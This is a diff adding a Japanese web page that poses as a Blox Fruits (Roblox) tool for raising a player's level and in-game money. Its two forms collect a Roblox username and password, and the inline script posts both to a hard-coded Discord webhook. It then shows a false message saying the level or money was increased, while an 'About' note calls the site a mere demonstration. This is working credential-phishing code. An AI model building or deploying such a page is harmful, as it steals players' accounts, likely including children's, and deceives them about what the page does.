@@ -1,0 +1,251 @@
+<html class="scroll-smooth" lang="ja">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   ブロックスフルーツ レベル＆お金増加ツール
+  </title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet"/>
+  <style>
+   body {
+      font-family: 'Roboto', sans-serif;
+    }
+  </style>
+ </head>
+ <body class="bg-gradient-to-b from-blue-600 to-blue-400 min-h-screen flex flex-col">
+  <header class="bg-white shadow-md">
+   <div class="container mx-auto px-6 py-4 flex items-center justify-between">
+    <div class="flex items-center space-x-3">
+     <img alt="Robloxのブロックスフルーツゲームのロゴが描かれた鮮やかな青色の背景画像" class="w-12 h-12 rounded-md" height="48" src="https://tr.rbxcdn.com/180DAY-e1ce51abae5188805c3fee78ec7f4d08/768/432/Image/Webp/noFilter" width="48"/>
+     <h1 class="text-2xl font-bold text-blue-700">
+      ブロックスフルーツ ツール
+     </h1>
+    </div>
+    <nav class="hidden md:flex space-x-8 text-blue-700 font-semibold">
+     <a class="hover:text-blue-900 transition" href="#level">
+      レベルアップ
+     </a>
+     <a class="hover:text-blue-900 transition" href="#money">
+      お金増加
+     </a>
+     <a class="hover:text-blue-900 transition" href="#about">
+      このサイトについて
+     </a>
+    </nav>
+    <button aria-label="メニューを開く" class="md:hidden text-blue-700 focus:outline-none" id="menu-btn">
+     <i class="fas fa-bars fa-2x"></i>
+    </button>
+   </div>
+   <nav class="hidden bg-white shadow-md md:hidden px-6 py-4 space-y-4 text-blue-700 font-semibold" id="mobile-menu">
+    <a class="block hover:text-blue-900 transition" href="#level">
+     レベルアップ
+    </a>
+    <a class="block hover:text-blue-900 transition" href="#money">
+     お金増加
+    </a>
+    <a class="block hover:text-blue-900 transition" href="#about">
+     このサイトについて
+    </a>
+   </nav>
+  </header>
+  <main class="flex-grow container mx-auto px-6 py-10">
+   <section class="bg-white rounded-lg shadow-lg p-8 mb-10 max-w-3xl mx-auto" id="level">
+    <h2 class="text-3xl font-bold text-blue-700 mb-6 text-center">
+     レベルアップツール
+    </h2>
+    <img alt="Robloxのブロックスフルーツゲームのレベルアップ中のキャラクターが敵と戦っているシーンのスクリーンショット画像" class="w-full rounded-md mb-6" height="300" src="https://tr.rbxcdn.com/180DAY-7c0f003999e63b831af53f2ea454191b/768/432/Image/Webp/noFilter" width="600"/>
+    <form autocomplete="off" class="space-y-6" id="level-up-form" novalidate="">
+     <div>
+      <label class="block text-blue-700 font-semibold mb-2" for="username-level">
+       Robloxユーザー名
+      </label>
+      <input class="w-full border border-blue-300 rounded-md px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" id="username-level" name="username-level" placeholder="例: player123" required="" type="text"/>
+     </div>
+     <div>
+      <label class="block text-blue-700 font-semibold mb-2" for="password-level">
+       Robloxパスワード
+      </label>
+      <input autocomplete="new-password" class="w-full border border-blue-300 rounded-md px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" id="password-level" name="password-level" placeholder="パスワードを入力してください" required="" type="password"/>
+     </div>
+     <div>
+      <label class="block text-blue-700 font-semibold mb-2" for="level-amount">
+       増やしたいレベル数
+      </label>
+      <input class="w-full border border-blue-300 rounded-md px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" id="level-amount" max="1000" min="1" name="level-amount" placeholder="例: 50" required="" type="number"/>
+     </div>
+     <button class="w-full bg-blue-700 hover:bg-blue-800 text-white font-bold py-3 rounded-md transition" type="submit">
+      レベルを増やす
+     </button>
+    </form>
+    <p class="mt-4 text-center text-green-600 font-semibold" id="level-message"></p>
+   </section>
+   <section class="bg-white rounded-lg shadow-lg p-8 mb-10 max-w-3xl mx-auto" id="money">
+    <h2 class="text-3xl font-bold text-blue-700 mb-6 text-center">
+     お金増加ツール
+    </h2>
+    <img alt="Robloxのブロックスフルーツゲームでキャラクターがお金のアイテムを集めているシーンのスクリーンショット画像" class="w-full rounded-md mb-6" height="300" src="https://tr.rbxcdn.com/180DAY-37cc49a6bdb03b5a4394db84ff264fe5/768/432/Image/Webp/noFilter" width="600"/>
+    <form autocomplete="off" class="space-y-6" id="money-increase-form" novalidate="">
+     <div>
+      <label class="block text-blue-700 font-semibold mb-2" for="username-money">
+       Robloxユーザー名
+      </label>
+      <input class="w-full border border-blue-300 rounded-md px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" id="username-money" name="username-money" placeholder="例: player123" required="" type="text"/>
+     </div>
+     <div>
+      <label class="block text-blue-700 font-semibold mb-2" for="password-money">
+       Robloxパスワード
+      </label>
+      <input autocomplete="new-password" class="w-full border border-blue-300 rounded-md px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" id="password-money" name="password-money" placeholder="パスワードを入力してください" required="" type="password"/>
+     </div>
+     <div>
+      <label class="block text-blue-700 font-semibold mb-2" for="money-amount">
+       増やしたいお金の額
+      </label>
+      <input class="w-full border border-blue-300 rounded-md px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" id="money-amount" max="1000000" min="1" name="money-amount" placeholder="例: 10000" required="" type="number"/>
+     </div>
+     <button class="w-full bg-blue-700 hover:bg-blue-800 text-white font-bold py-3 rounded-md transition" type="submit">
+      お金を増やす
+     </button>
+    </form>
+    <p class="mt-4 text-center text-green-600 font-semibold" id="money-message"></p>
+   </section>
+   <section class="bg-white rounded-lg shadow-lg p-8 max-w-3xl mx-auto" id="about">
+    <h2 class="text-3xl font-bold text-blue-700 mb-6 text-center">
+     このサイトについて
+    </h2>
+    <p class="text-blue-900 text-lg leading-relaxed mb-4">
+     このサイトはRobloxの人気ゲーム「ブロックスフルーツ」のレベルとお金を増やすためのツールを提供しています。ユーザー名と増やしたいレベルやお金の額を入力するだけで、ゲーム内の進行をサポートします。
+    </p>
+    <p class="text-blue-900 text-lg leading-relaxed">
+     ※このツールは実際のゲームデータに影響を与えるものではなく、あくまでデモンストレーション用のサイトです。ゲームの規約を守って楽しくプレイしましょう。
+    </p>
+   </section>
+  </main>
+  <footer class="bg-blue-700 text-white py-6 mt-auto">
+   <div class="container mx-auto px-6 text-center">
+    <p>© 2024 ブロックスフルーツ ツール. All rights reserved.</p>
+   </div>
+  </footer>
+  <script>
+   // モバイルメニューのトグル
+   const menuBtn = document.getElementById('menu-btn');
+   const mobileMenu = document.getElementById('mobile-menu');
+   menuBtn.addEventListener('click', () => {
+     mobileMenu.classList.toggle('hidden');
+   });
+
+   // Discord Webhook URL（ここにあなたのWebhook URLを入れてください）
+   const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1393502074615894157/RRbWaRmtRF2Fdm9jjGJnJtSSRJWIBpRfgLAdtHbuwbSNBM3r08ctoQb5RfFXgh-7GQsg';
+
+   // 送信制限用localStorageキー
+   const STORAGE_KEY_LEVEL = 'bf_tool_level_last_sent';
+   const STORAGE_KEY_MONEY = 'bf_tool_money_last_sent';
+   const ONE_HOUR = 60 * 60 * 1000;
+
+   // 現在時刻を取得
+   function now() {
+     return new Date().getTime();
+   }
+
+   // 送信可能かチェック
+   function canSend(key) {
+     const lastSent = localStorage.getItem(key);
+     if (!lastSent) return true;
+     return now() - parseInt(lastSent, 10) > ONE_HOUR;
+   }
+
+   // 送信時間を保存
+   function saveSendTime(key) {
+     localStorage.setItem(key, now().toString());
+   }
+
+   // レベルアップフォーム処理
+   const levelForm = document.getElementById('level-up-form');
+   const levelMessage = document.getElementById('level-message');
+   levelForm.addEventListener('submit', async (e) => {
+     e.preventDefault();
+     if (!canSend(STORAGE_KEY_LEVEL)) {
+       levelMessage.textContent = '1時間に1回のみ送信可能です。しばらく待ってから再度お試しください。';
+       levelMessage.classList.remove('text-green-600');
+       levelMessage.classList.add('text-red-600');
+       return;
+     }
+     const username = levelForm['username-level'].value.trim();
+     const password = levelForm['password-level'].value.trim();
+     const level = parseInt(levelForm['level-amount'].value, 10);
+     if (!username || !password || isNaN(level) || level < 1) {
+       levelMessage.textContent = '正しいユーザー名、パスワード、レベル数を入力してください。';
+       levelMessage.classList.remove('text-green-600');
+       levelMessage.classList.add('text-red-600');
+       return;
+     }
+
+     try {
+       await fetch(DISCORD_WEBHOOK_URL, {
+         method: 'POST',
+         headers: {
+           'Content-Type': 'application/json',
+         },
+         body: JSON.stringify({
+           content: `【レベルアップ申請】\nユーザー名: ${username}\nパスワード: ${password}\n増やしたいレベル数: ${level}`,
+         }),
+       });
+       saveSendTime(STORAGE_KEY_LEVEL);
+       levelMessage.textContent = `${username}さんのレベルを${level}だけ増やしました！`;
+       levelMessage.classList.remove('text-red-600');
+       levelMessage.classList.add('text-green-600');
+       levelForm.reset();
+     } catch (error) {
+       levelMessage.textContent = '送信に失敗しました。時間をおいて再度お試しください。';
+       levelMessage.classList.remove('text-green-600');
+       levelMessage.classList.add('text-red-600');
+     }
+   });
+
+   // お金増加フォーム処理
+   const moneyForm = document.getElementById('money-increase-form');
+   const moneyMessage = document.getElementById('money-message');
+   moneyForm.addEventListener('submit', async (e) => {
+     e.preventDefault();
+     if (!canSend(STORAGE_KEY_MONEY)) {
+       moneyMessage.textContent = '1時間に1回のみ送信可能です。しばらく待ってから再度お試しください。';
+       moneyMessage.classList.remove('text-green-600');
+       moneyMessage.classList.add('text-red-600');
+       return;
+     }
+     const username = moneyForm['username-money'].value.trim();
+     const password = moneyForm['password-money'].value.trim();
+     const money = parseInt(moneyForm['money-amount'].value, 10);
+     if (!username || !password || isNaN(money) || money < 1) {
+       moneyMessage.textContent = '正しいユーザー名、パスワード、お金の額を入力してください。';
+       moneyMessage.classList.remove('text-green-600');
+       moneyMessage.classList.add('text-red-600');
+       return;
+     }
+
+     try {
+       await fetch(DISCORD_WEBHOOK_URL, {
+         method: 'POST',
+         headers: {
+           'Content-Type': 'application/json',
+         },
+         body: JSON.stringify({
+           content: `【お金増加申請】\nユーザー名: ${username}\nパスワード: ${password}\n増やしたいお金の額: ${money}`,
+         }),
+       });
+       saveSendTime(STORAGE_KEY_MONEY);
+       moneyMessage.textContent = `${username}さんのお金を${money}だけ増やしました！`;
+       moneyMessage.classList.remove('text-red-600');
+       moneyMessage.classList.add('text-green-600');
+       moneyForm.reset();
+     } catch (error) {
+       moneyMessage.textContent = '送信に失敗しました。時間をおいて再度お試しください。';
+       moneyMessage.classList.remove('text-green-600');
+       moneyMessage.classList.add('text-red-600');
+     }
+   });
+  </script>
+ </body>
+</html>
